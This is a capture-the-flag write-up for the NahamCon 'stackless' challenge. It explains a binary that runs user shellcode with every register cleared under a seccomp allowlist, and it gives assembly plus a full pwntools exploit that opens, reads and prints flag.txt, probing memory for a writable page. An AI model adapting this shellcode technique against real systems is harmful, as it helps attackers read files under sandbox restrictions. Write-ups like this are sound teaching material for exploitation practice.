## Question 

Author: @M_alpha#3534

Oh no my stack!!!! 

[stackless](stackless), [stackless.c](stackless.c)

## Solution

I thought this was a great problem from [NahamCon](https://ctf.nahamcon.com). I just about solved it during the CTF. Afterwards, I saw a few solutions [1](https://github.com/MaherAzzouzi/LinuxExploitation/blob/master/NahamCon2022/stackless/solve.py), [2](https://discord.com/channels/598608711186907146/970036822338064394/970044239687856188), [3](https://discord.com/channels/598608711186907146/970036822338064394/970041417147756624) and then fixed my solution. One solution I completely missed was that ```fs:0``` still contained a heap address [4](https://discord.com/channels/598608711186907146/970036822338064394/970045488986464306).

The [challenge](stackless.c) initially creates a stack pivot at a random memory location for shellcode. 

```c
code = mmap((void *)addr, 0x1000, PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, 0, 0);
```

It then marks the memory region ```PROT_READ | PROT_EXEC``` only, jumps to it, and clears all the registers.

```c
mprotect(code, 0x1000, PROT_READ | PROT_EXEC)
...
__asm__ volatile(".intel_syntax noprefix\n"
                     "mov r15, %[addr]\n"
                     "xor rax, rax\n"
                     "xor rbx, rbx\n"
                     "xor rcx, rcx\n"
                     "xor rdx, rdx\n"
                     "xor rsp, rsp\n"
                     "xor rbp, rbp\n"
                     "xor rsi, rsi\n"
                     "xor rdi, rdi\n"
                     "xor r8, r8\n"
                     "xor r9, r9\n"
                     "xor r10, r10\n"
                     "xor r11, r11\n"
                     "xor r12, r12\n"
                     "xor r13, r13\n"
                     "xor r14, r14\n"
                     "jmp r15\n"
                     ".att_syntax"
                     :
                     : [addr] "r"(code));
```

Finally, there are also seccomp rules on the binary that only permit open, read, write, close, exit, exit_group

```
└─# seccomp-tools dump ./stackless 
Shellcode
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012
 0009: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0012
 0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

The solution is to obviously build shellcode that reads flag.txt by opening, reading and writing the contents of the flag to stdout. But this is a little tricky, given all the registers (including RSP) have been cleared and the stack is marked as non-writeable. 

The first challenge is to build an open() syscall that points to ```'flag.txt'``` using relative addressing off the instruction pointer. The length of our shellcode will end up being 78 bytes, but we can also determine that using ```print(len(shellcode)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))```, which I commented in the final solution.

```python
''' open(rax=0x2, rdi=rsp+len(shellcode), rsi=0x0, rdx=0x40000)'''
shellcode=asm("""
mov rax, 0x2
lea rdi, [rip]+78
mov rsi, 0x0
mov rdx, 0x4000
syscall
""")

#print(len(shellcode)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
shellcode+= b'flag.txt'
```

The next challenge is to determine a region to store the char* , which points to the file contents from the read() syscall. If we tried using our current stack to store the char* we would, we see RAX returns ```0xfffffffffffffff2```, which is errno 14 or ```bad address``` since the region is marked as readable and executable but not writeable. Thus, we will just create a loop that starts at ```0x7ff000000000```, counting up by 0x1000 bytes until we no longer get the ```bad address``` error.

```python
''' read(rax=0x0, rdi=fd(0x3), rsi=0x7ff000000000+offset, rdx=0x100)'''
shellcode+=asm("""
mov rsi, 0x7ff000000000
cmp_loop:
add rsi, 0x1000
mov rax, 0x0
mov rdi, 0x3
mov rdx, 0x100
syscall; cmp rax, 0xfffffffffffffff2
je cmp_loop
""")
```

After this we will put our solution together by writing 0x100 bytes of ```flag.txt``` to stdout.

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b *$rebase(0x00001833)
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

''' open(rax=0x2, rdi=rsp+len(shellcode), rsi=0x0, rdx=0x40000)'''
shellcode=asm("""
mov rax, 0x2
lea rdi, [rip]+78
mov rsi, 0x0
mov rdx, 0x4000
syscall
""")

''' read(rax=0x0, rdi=fd(0x3), rsi=0x7ff000000000+offset, rdx=0x100)'''
shellcode+=asm("""
mov rsi, 0x7ff000000000
cmp_loop:
add rsi, 0x1000
mov rax, 0x0
mov rdi, 0x3
mov rdx, 0x100
syscall; cmp rax, 0xfffffffffffffff2
je cmp_loop
""")

''' write(rax=0x1, rdi=stdout=0x1, rdx=0x100)'''
shellcode+=asm("""
mov rax, 0x1
mov rdi, 0x1
syscall
""")

#print(len(shellcode)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
''' append flag.txt to stack '''
shellcode+=b'flag.txt\0'


p.recvuntil(b'Shellcode length')
p.sendline(b"%i" %len(shellcode))
p.recvuntil(b'Shellcode')
p.sendline(shellcode)

p.interactive()
```

